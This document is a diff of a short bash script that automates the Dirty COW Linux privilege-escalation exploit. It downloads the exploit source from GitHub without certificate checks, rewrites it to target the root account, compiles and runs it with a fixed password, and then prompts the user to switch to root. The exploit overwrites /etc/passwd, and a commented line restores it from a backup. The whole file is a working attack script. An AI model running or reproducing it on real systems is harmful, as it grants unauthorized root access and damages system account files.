@@ -1,12 +1,19 @@
 #!/bin/bash
 
-curl -k https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > dirty.c
+USER=root
+PASSWORD=2142
 
-sed -i 's/firefart/root/g' dirty.c
+SRC=dirty.c
+COWNAME=dirty
 
-gcc -pthread dirty.c -o dirty -lcrypt
+curl -ks https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > $SRC
 
-# ./dirty 2142
-# su root
+sed -i "s/firefart/$USER/g" $SRC
+
+gcc $SRC -o $COWNAME -lcrypt -lpthread
+
+timeout 10s ./$COWNAME $PASSWORD
+
+echo "Try access root with su ($USER:$PASSWORD)"
 
 # mv /tmp/passwd.bak /etc/passwd
